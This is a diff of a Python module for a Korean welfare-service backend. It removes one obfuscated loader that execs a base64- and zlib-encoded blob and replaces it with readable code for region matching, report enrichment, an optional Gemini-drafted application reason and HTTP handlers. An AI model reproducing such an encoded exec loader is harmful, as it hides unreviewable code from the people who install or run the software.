@@ -1,68 +1,244 @@
 from __future__ import annotations
-import base64
-import zlib
-exec(compile(zlib.decompress(base64.b64decode(
-    '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'
-)).decode('utf-8'), __file__, 'exec'))
+
+import json
+import re
+from datetime import datetime
+from typing import Any
+from urllib.parse import urlparse
+
+import backend_server as b
+
+SIDO_ALIASES = {
+    "서울특별시": "서울", "서울시": "서울", "서울": "서울",
+    "부산광역시": "부산", "부산시": "부산", "부산": "부산",
+    "대구광역시": "대구", "대구시": "대구", "대구": "대구",
+    "인천광역시": "인천", "인천시": "인천", "인천": "인천",
+    "광주광역시": "광주", "광주시": "광주", "광주": "광주",
+    "대전광역시": "대전", "대전시": "대전", "대전": "대전",
+    "울산광역시": "울산", "울산시": "울산", "울산": "울산",
+    "세종특별자치시": "세종", "세종시": "세종", "세종": "세종",
+    "경기도": "경기", "경기": "경기",
+    "강원특별자치도": "강원", "강원도": "강원", "강원": "강원",
+    "충청북도": "충북", "충북": "충북",
+    "충청남도": "충남", "충남": "충남",
+    "전북특별자치도": "전북", "전라북도": "전북", "전북": "전북",
+    "전라남도": "전남", "전남": "전남",
+    "경상북도": "경북", "경북": "경북",
+    "경상남도": "경남", "경남": "경남",
+    "제주특별자치도": "제주", "제주도": "제주", "제주": "제주",
+}
+NATIONWIDE = {"", "전국", "중앙", "공통", "온라인", "복지로", "정부24"}
+LOCAL_SOURCES = {"지자체", "광역", "기초", "시군구"}
+COMMON_FORM_URL = "https://www.gov.kr/mw/AA020InfoCappView.do?CappBizCD=14600000275"
+
+
+def clean(value: Any) -> str:
+    return b.clean_text(str(value or ""))
+
+
+def normalize_region_name(region: Any) -> tuple[str, str]:
+    value = re.sub(r"\s+", " ", clean(region)).strip()
+    if not value:
+        return "", ""
+    if value in NATIONWIDE:
+        return "전국", ""
+    tokens = value.split()
+    sido = SIDO_ALIASES.get(tokens[0], "")
+    sigungu = tokens[1] if len(tokens) > 1 else ""
+    if not sido:
+        for alias, canonical in sorted(SIDO_ALIASES.items(), key=lambda item: len(item[0]), reverse=True):
+            if value.startswith(alias):
+                sido = canonical
+                sigungu = value[len(alias):].strip().split(" ")[0] if value[len(alias):].strip() else ""
+                break
+    if not sido and len(tokens) == 1:
+        bare = re.sub(r"(특별시|광역시|특별자치시|특별자치도|자치도|도|시)$", "", tokens[0])
+        sido = SIDO_ALIASES.get(bare, bare)
+    sigungu = re.sub(r"(특례시|시|군|구)$", "", sigungu)
+    return sido, sigungu
+
+
+def is_region_compatible(service: dict[str, Any] | None, case_region: Any, structured: dict[str, Any] | None = None) -> bool:
+    if not isinstance(service, dict):
+        return False
+    requested = clean(case_region) or clean((structured or {}).get("region"))
+    service_region = clean(service.get("region"))
+    service_source = clean(service.get("source"))
+    if service_region in NATIONWIDE or service_source == "중앙":
+        return True
+    if not requested:
+        return service_source not in LOCAL_SOURCES
+    case_sido, case_sigungu = normalize_region_name(requested)
+    service_sido, service_sigungu = normalize_region_name(service_region)
+    if service_sido in {"", "전국"}:
+        return service_source not in LOCAL_SOURCES
+    if not case_sido or service_sido != case_sido:
+        return False
+    if service_sigungu and case_sigungu:
+        return service_sigungu == case_sigungu or service_sigungu in case_sigungu or case_sigungu in service_sigungu
+    return True
+
+
+def selected_services(package: dict[str, Any], catalog: list[dict[str, Any]] | None) -> list[dict[str, Any]]:
+    services = []
+    for item in package.get("items", []):
+        if item.get("included", True):
+            service = b.find_service(item.get("serviceId", ""), catalog)
+            if service:
+                services.append(service)
+    return services
+
+
+def service_detail_template(service: dict[str, Any]) -> dict[str, Any]:
+    name = clean(service.get("name"))
+    laws = list(service.get("laws") or [])
+    if not laws:
+        if "긴급" in clean(service.get("urgency")) or "긴급복지" in name:
+            laws = ["긴급복지지원법 및 같은 법 시행령"]
+        elif "취업" in (service.get("domains") or []) or "고용" in name:
+            laws = ["고용정책 기본법 및 국민취업지원제도 운영 관련 고시"]
+        else:
+            laws = ["사회보장급여의 이용ㆍ제공 및 수급권자 발굴에 관한 법률"]
+    return {
+        "service": name,
+        "selectionCriteria": clean(service.get("selectionCriteria")) or clean(service.get("eligibility")),
+        "support": clean(service.get("support")),
+        "applicationSteps": b.unique([clean(service.get("process")), "주소지 읍면동 주민센터 또는 해당 접수기관 상담", "신청서 및 증빙서류 제출", "자격 확인 후 보장 결정 통지"]),
+        "requiredDocs": b.unique([*(service.get("docs") or []), "사회보장급여 신청(변경)서", "신분증", "소득ㆍ재산 확인자료", "가구원 및 거주 사실 확인자료"]),
+        "legalBasis": laws,
+        "officialUrl": clean(service.get("detailUrl") or service.get("url")),
+    }
+
+
+def fallback_application_draft(case: dict[str, Any], structured: dict[str, Any], services: list[dict[str, Any]]) -> str:
+    target = clean(case.get("targetType") or structured.get("target") or "대상자")
+    region = clean(case.get("region") or structured.get("region") or "거주지")
+    needs = structured.get("needs") or case.get("issueTypes") or []
+    service_names = ", ".join(clean(service.get("name")) for service in services[:4] if service.get("name"))
+    memo = clean(case.get("memo"))[:220] or "상담 과정에서 생계ㆍ주거ㆍ의료 등 복합적인 복지 욕구가 확인되었습니다."
+    return f"신청인은 {region}에 거주하는 {target}로, 상담 결과 {', '.join(needs) or '복지급여'} 관련 지원 필요성이 확인되었습니다. {memo} 위와 같은 사유로 현재 가구의 생활 안정과 위기 완화를 위하여 {service_names or '해당 복지급여'}의 제공을 신청하고자 합니다. 제출 서류와 소득ㆍ재산 및 가구 구성 확인 절차에 성실히 협조하겠습니다."
+
+
+def llm_application_draft(case: dict[str, Any], structured: dict[str, Any], services: list[dict[str, Any]], fallback: str) -> tuple[str, bool]:
+    if not getattr(b, "GEMINI_API_KEY", "") or not services:
+        return fallback, False
+    prompt = f"""
+공식 복지 신청서의 [신청 사유] 란에 붙여넣을 격식체 문단을 작성한다.
+허위 사실, 확정되지 않은 수급 가능성, 개인정보 원문 노출은 금지한다.
+180~350자 한국어 문단 하나만 JSON으로 반환한다.
+반환 형식: {{"applicationDraft": "..."}}
+상담 사례: {json.dumps(case, ensure_ascii=False)}
+구조화 결과: {json.dumps(structured, ensure_ascii=False)}
+신청 후보 서비스: {json.dumps([service_detail_template(service) for service in services[:5]], ensure_ascii=False)}
+"""
+    try:
+        data = b.call_gemini_json(prompt, temperature=0.2)
+        draft = clean(data.get("applicationDraft"))
+        return draft or fallback, bool(draft)
+    except Exception:
+        return fallback, False
+
+
+def enrich_report(report: dict[str, Any], case: dict[str, Any], structured: dict[str, Any], package: dict[str, Any], catalog: list[dict[str, Any]] | None) -> dict[str, Any]:
+    services = selected_services(package, catalog)
+    fallback = fallback_application_draft(case, structured, services)
+    draft, used_llm = llm_application_draft(case, structured, services, fallback)
+    official_links = b.unique([
+        {"label": "사회보장급여 신청(변경) 민원 안내", "url": COMMON_FORM_URL, "type": "common-form"},
+        *[{"label": f"{service.get('name', '복지서비스')} 공고/상세", "url": clean(service.get("detailUrl") or service.get("url") or COMMON_FORM_URL), "type": "service-detail"} for service in services],
+    ])
+    return {
+        **report,
+        "applicationDraft": draft,
+        "applicationDraftLlmUsed": used_llm,
+        "serviceDetails": [service_detail_template(service) for service in services],
+        "officialLinks": official_links,
+        "hwpGuide": {
+            "formName": "사회보장급여 신청(변경)서 [별지 제1호서식]",
+            "applicantName": "신청인 성명란에 대상자 또는 대리 신청인 성명을 기재",
+            "residentNoMasked": "주민등록번호는 앞 6자리와 뒤 첫 자리 확인 후 마스킹 보관",
+            "address": clean(case.get("region") or structured.get("region") or ""),
+            "services": [clean(service.get("name")) for service in services if service.get("name")],
+            "householdType": clean(case.get("targetType") or structured.get("target") or ""),
+            "applicationReason": draft,
+        },
+    }
+
+
+def install_region_wrappers() -> None:
+    original_service_score = b.service_score
+    def service_score(service: dict[str, Any], needs: list[str], case: dict[str, Any], structured: dict[str, Any] | None = None) -> int:
+        if not is_region_compatible(service, case.get("region"), structured):
+            return 0
+        return original_service_score(service, needs, case, structured)
+    b.service_score = service_score
+
+    original_filter_services = b.filter_services
+    def filter_services(query: dict[str, list[str]]):
+        services, meta = original_filter_services(query)
+        region = (query.get("region", [""])[0] or "").strip()
+        if region:
+            before = len(services)
+            services = [service for service in services if is_region_compatible(service, region)]
+            meta = {**meta, "regionFilter": {"region": region, "removed": before - len(services), "strict": True}}
+        return services, meta
+    b.filter_services = filter_services
+
+    original_generate_packages = b.generate_packages
+    def generate_packages(case: dict[str, Any], structured: dict[str, Any] | None, catalog: list[dict[str, Any]] | None = None):
+        region = case.get("region") or (structured or {}).get("region") or ""
+        filtered_catalog = [service for service in catalog if is_region_compatible(service, region, structured)] if catalog and region else catalog
+        packages = original_generate_packages(case, structured, filtered_catalog)
+        for package in packages:
+            package["items"] = [item for item in package.get("items", []) if not region or is_region_compatible(b.find_service(item.get("serviceId", ""), filtered_catalog), region, structured)]
+        return packages
+    b.generate_packages = generate_packages
+
+
+def install_report_wrapper() -> None:
+    original_build_report = b.build_report
+    def build_report(case: dict[str, Any], structured: dict[str, Any] | None, package: dict[str, Any], catalog: list[dict[str, Any]] | None = None, providers: list[dict[str, Any]] | None = None):
+        structured_result = structured or b.analyze_case(case)
+        report = original_build_report(case, structured_result, package, catalog, providers)
+        return enrich_report(report, case, structured_result, package, catalog)
+    b.build_report = build_report
+
+
+def install_http_helpers() -> None:
+    native_do_get = b.WelfareHandler.do_GET
+    def patched_do_get(self):
+        parsed = urlparse(self.path)
+        if parsed.path == "/dashboard-hwp-patch.js":
+            body = (b.ROOT / "dashboard-hwp-patch.js").read_bytes()
+            self.send_response(b.HTTPStatus.OK)
+            self.send_header("Content-Type", "application/javascript; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        return native_do_get(self)
+
+    def do_DELETE(self):
+        parsed = urlparse(self.path)
+        if parsed.path.startswith("/api/cases/"):
+            case_id = parsed.path.rsplit("/", 1)[-1]
+            before_saved, before_recent = len(b.SAVED_CASES), len(b.RECENT_CASES)
+            b.SAVED_CASES[:] = [item for item in b.SAVED_CASES if item.get("id") != case_id]
+            b.RECENT_CASES[:] = [item for item in b.RECENT_CASES if item.get("id") != case_id]
+            deleted = before_saved != len(b.SAVED_CASES) or before_recent != len(b.RECENT_CASES)
+            return self.write_json({"ok": True, "deleted": deleted, "id": case_id, "time": datetime.now().isoformat()})
+        return self.write_json({"error": "not_found"}, b.HTTPStatus.NOT_FOUND)
+
+    b.WelfareHandler.do_GET = patched_do_get
+    b.WelfareHandler.do_DELETE = do_DELETE
+
+
+def apply() -> None:
+    if getattr(b, "WELFARE_FEATURE_PATCH_APPLIED", False):
+        return
+    install_region_wrappers()
+    install_report_wrapper()
+    install_http_helpers()
+    b.is_region_compatible = is_region_compatible
+    b.normalize_region_name = normalize_region_name
+    b.WELFARE_FEATURE_PATCH_APPLIED = True
